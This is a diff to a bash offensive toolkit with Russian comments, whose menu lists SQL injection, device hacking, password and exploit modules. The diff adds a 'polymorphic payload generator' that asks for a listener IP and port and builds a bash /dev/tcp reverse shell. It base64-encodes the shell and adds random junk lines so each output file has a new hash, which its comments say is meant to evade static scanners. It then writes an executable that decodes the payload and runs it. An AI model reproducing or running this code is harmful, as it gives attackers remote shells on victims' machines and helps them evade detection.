@@ -539,8 +539,8 @@ EOF
 # --- Конец  Модулей ---
 # --- ГЛАВНОЕ МЕНЮ ---
 run_main_menu() {
-    local main_names="GHOST_COMMANDER SOCIAL_ENG MUTAGEN_SQL DEVICE_HACK TOTAL_OSINT IBAN_SCAN PASS_LAB CRYPTO_FORGE Ghost_Engine ULTIMATE_EXPLOIT PC_RECOVERY INTELLIGENCE_CENTER MESH_BRIDGE SYSTEM_INFO SERVICE_HUB REPAIR UPDATE_CORE EXIT"
-    local main_funcs="run_ghost_commander run_phantom_engine run_sql_adaptive run_device_hack run_smart_osint_engine run_iban_analyzer run_pass_lab run_crypto_forge run_vulnerability_scanner run_prime_exploiter_v5 pc_password_recovery run_view_loot run_mesh_bridge run_system_info run_servers run_repair update_prime exit_script"
+    local main_names="GHOST_COMMANDER SOCIAL_ENG MUTAGEN_SQL DEVICE_HACK TOTAL_OSINT IBAN_SCAN PASS_LAB CRYPTO_FORGE Ghost_Engine ULTIMATE_EXPLOIT PC_RECOVERY INTELLIGENCE_CENTER MESH_BRIDGE POLYMORPH_GEN SYSTEM_INFO SERVICE_HUB REPAIR UPDATE_CORE EXIT"
+    local main_funcs="run_ghost_commander run_phantom_engine run_sql_adaptive run_device_hack run_smart_osint_engine run_iban_analyzer run_pass_lab run_crypto_forge run_vulnerability_scanner run_prime_exploiter_v5 pc_password_recovery run_view_loot run_mesh_bridge generate_poly_payload run_system_info run_servers run_repair update_prime exit_script"
 
  
    # Динамическая справка для всех ключевых модулей системы
@@ -794,6 +794,47 @@ update_prime() {
         rm -f "${target_path}.tmp"
         pause
     fi
+}
+
+
+# --- ENGINE: DYNAMIC POLYMORPHISM (ZERO-FOOTPRINT) ---
+
+generate_poly_payload() {
+    print_header "PRIME POLYMORPH: GHOST PAYLOAD GENERATOR"
+    
+    echo -en "${Y}Enter local IP for Listener: ${NC}"
+    read -r lhost
+    echo -en "${Y}Enter local Port: ${NC}"
+    read -r lport
+
+    local raw_payload="bash -i >& /dev/tcp/$lhost/$lport 0>&1"
+    local output_file="$PRIME_LOOT/ghost_payload_$RANDOM.sh"
+
+    print_status "i" "Initializing Polymorphic Engine..."
+
+    # 1. Генерируем случайный ключ обфускации
+    local key=$(tr -dc 'A-Za-z0-9' < /dev/urandom | head -c 16)
+    
+    # 2. Создаем "Мусорный код" для изменения хеш-суммы файла
+    local junk="# $(date +%s) | $(tr -dc 'a-z' < /dev/urandom | head -c 32)"
+
+    # 3. Применяем Base64 с динамической обфускацией
+    # Мы не просто кодируем, мы ломаем структуру для статических сканеров
+    local encoded=$(echo -n "$raw_payload" | base64 | tr -d '\n')
+    
+    # Сборка финального полиморфного файла
+    {
+        echo "#!/bin/bash"
+        echo "$junk"
+        echo "K=\"$key\""
+        echo "echo \"$encoded\" | base64 -d | bash"
+    } > "$output_file"
+
+    chmod +x "$output_file"
+    print_status "y" "Polymorphic Payload Secured: $output_file"
+    print_status "s" "Signature: $(sha256sum "$output_file" | awk '{print $1}')"
+    
+    pause
 }
 
 
